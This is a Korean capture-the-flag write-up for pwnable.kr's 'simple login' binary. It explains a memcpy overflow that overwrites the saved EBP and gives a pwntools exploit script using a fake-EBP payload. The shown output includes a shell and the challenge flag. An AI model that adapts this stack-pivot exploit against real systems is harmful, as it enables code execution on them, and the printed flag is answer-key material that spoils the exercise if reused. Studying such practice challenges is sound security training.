# [pwnable.kr] simple login writeup

#### [summary] fake ebp

```shell
Can you get authentication from this server?

Download : http://pwnable.kr/bin/login

Running at : nc pwnable.kr 9003
```



실행시켜보면 입력을 받고 특정 루틴에 따라 hash를 계산하여 출력한다.

```shell
ch4rli3kop@Mandu:~/Downloads$ ./login 
Authenticate : AAAAA
hash : b26fd022d7efc5b78180f16ada99c32a
```



이제 내부를 분석할 차례인데, IDA가 없으니 pseudo 코드를 나타낼 수 없어 뭐로 설명해야할 지 잘 모르겠다. 귀찮으니 그냥 요약하겠음



사용자의 입력은 우선 스택에 입력받은 뒤, `Base64Decode()` 함수를 거쳐 decoding 된 뒤, `memcpy`를 통해 .bss 영역의 input(0x811eb40)에 저장된다.

이 후 `auth()`를 거쳐서 `calc_md5()`를 통해 계산된 hash 값을 0x80da684에 저장되어 있는 `f87cd601aa7fedca99018a8be88eda34`와 비교하는데, 이게 같으면 `correct()`가 실행된다.



취약점은 길이 제한없이 복사하는 `memcpy` 때문에 발생하게 되는데, `auth()` 내부에 존재하는 `memcpy`에서 input(0x811eb40)에 저장되어있는 값을 stack에 복사하면서 __EBP__를 덮을 수 있는 취약점이 발생한다. (`main()`에 존재하는 `memcpy`는 입력의 길이 제한때문에 별 문제없이 동작함)



별 특별한 동작없이 `auth()`와 `main()`의 함수 에필로그가 연달아 수행되기 때문에, 걍 fake ebp를 사용하면 된다.



#### exploit

```python
#!/usr/bin/python
from pwn import *
import base64

r = remote('pwnable.kr', 9003)

payload = p32(0x8049278)*2+p32(0x811eb40)
r.sendline(base64.encodestring(payload))

r.interactive()
```

흐름대로 따라가면 payload의 첫 번째 4바이트는 결국 스택처럼 사용되는 공간인데, input 공간이 적당한 위치의 .bss 영역에 존재하므로 대충 input 주소로 맞춰주어도 무방하다.

위의 페이로드는 우선 0x811eb40이 `auth()`의 __EBP__를 덮어서 `auth()`의 에필로그 과정에서 __EBP__가 0x811eb40으로 된다. 그 후 `main()`의 에필로그 과정에서 첫 번째 0x8049278(correct의 내부 주소)은 새로운 __EBP__ 값으로, 그 다음 0x8049278은 새로운 __EIP__가 된다.



```shell
ch4rli3kop@Mandu:~/WRITE-UP/pwnkr/simple_login$ python sol.py 
[+] Opening connection to pwnable.kr on port 9003: Done
[*] Switching to interactive mode
Authenticate : hash : 328f78c8913117042ea4b3541aa8899d
Congratulation! you are good!
$ id
uid=1037(simplelogin) gid=1037(simplelogin) groups=1037(simplelogin)
$ cat flag
control EBP, control ESP, control EIP, control the world~
```

